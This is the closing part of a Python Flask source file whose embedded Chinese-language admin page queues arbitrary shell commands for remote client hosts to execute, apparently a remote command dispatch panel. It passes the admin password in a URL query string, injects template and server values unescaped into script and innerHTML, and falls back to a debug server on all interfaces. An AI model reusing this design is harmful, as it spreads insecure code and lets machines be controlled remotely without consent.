                <div id="status" class="p-4 sm:p-5 md:p-4 text-center text-gray-700 text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center">
                    <i class="fa-solid fa-lock text-secondary mr-2 text-base sm:text-xl"></i>
                    <span>请先验证管理员身份</span>
                </div>

                <!-- 命令执行区域（默认隐藏） -->
                <div id="command-section" class="hidden w-full space-y-4">
                    <div class="w-full">
                        <label for="command-input" class="block text-sm sm:text-base font-medium text-dark mb-2">
                            <i class="fa-solid fa-code text-success mr-1"></i> 输入执行命令
                        </label>
                        <textarea 
                            id="command-input" 
                            placeholder="例如：dir (Windows) 或 ls (Linux/Mac)，支持单行命令" 
                            class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-success/50 focus:border-success focus:outline-none transition-all duration-300 placeholder:text-gray-400 min-h-[120px] sm:min-h-[150px] text-sm sm:text-base"
                        ></textarea>
                        <p class="text-xs text-secondary mt-1">
                            <i class="fa-solid fa-exclamation-triangle mr-1"></i>
                            注意：命令将在客户端主机上直接执行，请谨慎操作！
                        </p>
                    </div>
                    <div class="flex flex-col sm:flex-row gap-2 sm:gap-3">
                        <button 
                            id="execute-btn" 
                            class="bg-primary text-white px-4 sm:px-5 md:px-6 py-2 sm:py-3 rounded-lg font-medium transition-all duration-300 hover:bg-primary/90 hover:shadow-md active:scale-95 focus:ring-2 focus:ring-primary/50 focus:ring-offset-2 w-full sm:w-auto md:w-auto text-sm sm:text-base flex items-center justify-center gap-2"
                        >
                            <i class="fa-solid fa-play"></i> 
                            <span>执行命令</span>
                        </button>
                        <button 
                            id="clear-btn" 
                            class="bg-secondary text-white px-4 sm:px-5 md:px-6 py-2 sm:py-3 rounded-lg font-medium transition-all duration-300 hover:bg-secondary/90 hover:shadow-md active:scale-95 focus:ring-2 focus:ring-secondary/50 focus:ring-offset-2 w-full sm:w-auto md:w-auto text-sm sm:text-base flex items-center justify-center gap-2"
                        >
                            <i class="fa-solid fa-trash"></i> 
                            <span>清空输入</span>
                        </button>
                    </div>
                    <!-- 执行结果提示区域 -->
                    <div id="result-area" class="mt-4 p-3 border border-gray-200 rounded-lg min-h-[60px] hidden">
                        <p id="result-text" class="text-sm sm:text-base text-dark"></p>
                    </div>
                </div>
            </div>
        </main>

        <script>
            document.addEventListener('DOMContentLoaded', () => {
                const ip = "{{ ip }}";
                const passwordInput = document.getElementById('password');
                const authBtn = document.getElementById('auth-btn');
                const executeBtn = document.getElementById('execute-btn');
                const clearBtn = document.getElementById('clear-btn');
                const commandInput = document.getElementById('command-input');
                const statusEl = document.getElementById('status');
                const commandSection = document.getElementById('command-section');
                const commandCard = document.getElementById('command-card');
                const resultArea = document.getElementById('result-area');
                const resultText = document.getElementById('result-text');
                let isAuthenticated = false;
                let adminPassword = '';

                // 设备检测
                const isMobile = /iPhone|Android/.test(navigator.userAgent) && !/iPad|Tablet/.test(navigator.userAgent);
                const isTablet = /iPad|Tablet|Android/.test(navigator.userAgent) && !isMobile;

                // 验证身份按钮点击事件
                authBtn.addEventListener('click', () => {
                    adminPassword = passwordInput.value;
                    if (!adminPassword) {
                        showToast('请输入管理员密码');
                        return;
                    }
                    // 简单验证（实际通过后端接口验证，这里仅前端状态切换）
                    statusEl.className = 'p-4 sm:p-5 md:p-4 text-center text-gray-700 text-sm sm:text-lg md:text-base min-h-[80px] sm:min-h-[100px] flex items-center justify-center';
                    statusEl.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2 text-base sm:text-xl"></i><span>验证中...</span>';
                    setTimeout(() => {
                        // 调用后端check_password接口验证密码
                        fetch(`/check_password?password=${adminPassword}`).then(response => {
                            if (!response.ok) {
                                isAuthenticated = false;
                                statusEl.innerHTML = `
                                    <i class="fa-solid fa-lock text-secondary mr-2 text-base sm:text-xl"></i>
                                    <span>请先验证管理员身份</span>
                                `;
                                commandSection.classList.add('hidden');
                                showToast('Forbidden');
                                return;
                            }else{
                                isAuthenticated = true;
                                statusEl.classList.add('hidden');
                                commandSection.classList.remove('hidden');
                                showToast('身份验证成功');
                            }
                        });
                    }, 800); // 模拟异步验证延迟
                });

                // 执行命令按钮点击事件
                executeBtn.addEventListener('click', async () => {
                    if (!isAuthenticated) {
                        showToast('请先验证管理员身份');
                        return;
                    }
                    const command = commandInput.value.trim();
                    if (!command) {
                        showToast('请输入要执行的命令');
                        return;
                    }
                    executeBtn.disabled = true;
                    executeBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2"></i><span>执行中...</span>';
                    resultArea.classList.remove('hidden');
                    resultText.className = 'text-sm sm:text-base text-gray-700';
                    resultText.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2"></i> 正在下发命令，请等待客户端执行...';

                    try {
                        // 调用后端set_command接口下发命令
                        const response = await fetch('/set_command', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                ip: ip,
                                password: adminPassword,
                                command: command
                            })
                        });
                        const data = await response.json();
                        if (data.code === 200) {
                            resultText.className = 'text-sm sm:text-base text-success';
                            resultText.innerHTML = `<i class="fa-solid fa-check-circle mr-2"></i> ${data.msg}，客户端将在5秒内执行该命令`;
                            showToast('命令下发成功');
                            // 监测命令执行情况
                            // 轮询检查命令执行状态
                            let statusCheckInterval = setInterval(async () => {
                                const statusResponse = await fetch('/get_command_status?ip=' + ip);
                                const statusData = await statusResponse.json();
                                if (statusData.code === 200 && !statusData.command) {
                                    clearInterval(statusCheckInterval);
                                    resultText.className = 'text-sm sm:text-base text-success';
                                    resultText.innerHTML = `<i class="fa-solid fa-check-circle mr-2"></i> 命令已执行`;
                                }
                            }, 5000); // 每5秒检查一次
                            
                        } else {
                            resultText.className = 'text-sm sm:text-base text-danger';
                            resultText.innerHTML = `<i class="fa-solid fa-times-circle mr-2"></i> 命令下发失败：${data.msg || '未知错误'}`;
                            commandCard.classList.add('animate-shake');
                            setTimeout(() => commandCard.classList.remove('animate-shake'), 500);
                        }
                    } catch (error) {
                        resultText.className = 'text-sm sm:text-base text-danger';
                        resultText.innerHTML = `<i class="fa-solid fa-times-circle mr-2"></i> 网络错误：${error.message}`;
                        commandCard.classList.add('animate-shake');
                        setTimeout(() => commandCard.classList.remove('animate-shake'), 500);
                    } finally {
                        executeBtn.disabled = false;
                        executeBtn.innerHTML = '<i class="fa-solid fa-play mr-2"></i><span>执行命令</span>';
                    }
                });

                // 清空输入按钮点击事件
                clearBtn.addEventListener('click', () => {
                    commandInput.value = '';
                    resultArea.classList.add('hidden');
                    resultText.innerHTML = '';
                });

                // 轻量提示框
                function showToast(message) {
                    const toast = document.createElement('div');
                    const toastClass = isMobile ? 'text-sm px-3 py-2' : (isTablet ? 'text-base px-4 py-2' : 'text-base px-4 py-3');
                    toast.className = `fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-dark/80 text-white ${toastClass} rounded-lg z-50 transition-all duration-300`;
                    toast.textContent = message;
                    document.body.appendChild(toast);
                    setTimeout(() => {
                        toast.classList.add('opacity-0');
                        setTimeout(() => document.body.removeChild(toast), 300);
                    }, isMobile ? 2000 : 3000);
                }
            });

            // 样式补充
            const style = document.createElement('style');
            style.textContent = `
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-3px); }
                    75% { transform: translateX(3px); }
                }
                @media (min-width: 1024px) {
                    @keyframes shake {
                        0%, 100% { transform: translateX(0); }
                        25% { transform: translateX(-5px); }
                        75% { transform: translateX(5px); }
                    }
                }
                .animate-shake {
                    animation: shake 0.5s ease-in-out;
                }
                .custom-scrollbar::-webkit-scrollbar {
                    width: 4px;
                    height: 4px;
                }
                @media (min-width: 768px) {
                    .custom-scrollbar::-webkit-scrollbar {
                        width: 5px;
                        height: 5px;
                    }
                }
                @media (min-width: 1024px) {
                    .custom-scrollbar::-webkit-scrollbar {
                        width: 6px;
                        height: 6px;
                    }
                }
                .custom-scrollbar::-webkit-scrollbar-track {
                    background: #f1f1f1;
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb {
                    background: #d1d5db;
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                    background: #9ca3af;
                }
                textarea {
                    resize: vertical;
                }
            `;
            document.head.appendChild(style);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, ip=ip)

def main():
    try:
        # raise Exception("Force Flask dev server for demonstration")
        serve(app, host="0.0.0.0", port=5000, threads=16, backlog=2048)
    except Exception as e:
        print(f"Waitress启动失败，使用Flask开发服务器: {e}")
        app.run(host="0.0.0.0", port=5000, debug=True)

if __name__ == "__main__":
    main()
